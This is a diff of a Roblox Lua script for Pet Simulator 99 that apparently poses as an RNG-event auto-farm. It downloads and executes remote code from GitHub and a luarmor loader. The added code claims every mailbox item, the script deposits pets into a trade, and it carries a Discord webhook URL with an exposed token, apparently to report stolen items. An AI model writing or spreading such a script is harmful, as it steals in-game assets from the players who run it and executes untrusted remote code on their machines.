@@ -1,14 +1,49 @@
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
 wait(35)
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local const = require(game.ReplicatedStorage.Library.Directory)
+local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
 local library = require(game.ReplicatedStorage.Library.Client.Save)
+local Network = ReplicatedStorage:WaitForChild("Network")
+local MailboxClaim = Network:WaitForChild("Mailbox: Claim")
+
+local player = game:GetService("Players").LocalPlayer
+local itemsFrame = player.PlayerGui["_MACHINES"].MailboxMachine.Frame.GiftsFrame.ItemsFrame
 local save = library.Get()
 
 local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
 local request = http_request
+
+
+local frameFound = false
+
+
+local function claimMail(mailId)
+    local args = {
+        [1] = {
+            [1] = mailId
+        }
+    }
+    MailboxClaim:InvokeServer(unpack(args))
+end
+
+
+for _, itemFrame in pairs(itemsFrame:GetChildren()) do
+    if itemFrame:IsA("Frame") then
+        frameFound = true
+        local mailId = itemFrame.Name
+        claimMail(mailId)
+        task.wait(1)
+    end
+end
+
+
+if not frameFound then
+    print("MAIL EMPTY")
+end
+
+
+
 
 local args = {
     [1] = "Default"
@@ -84,10 +119,6 @@ end
 DepositPetInTrade()
 
 wait(2)
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
-
 local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
 
 local request = http_request
@@ -185,5 +216,3 @@ getgenv().RngEvent = {
     print_all_info = false, -- Will Print All Egg & Upgrade Names; for future updates (mainly for kw devs)
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()
-
-
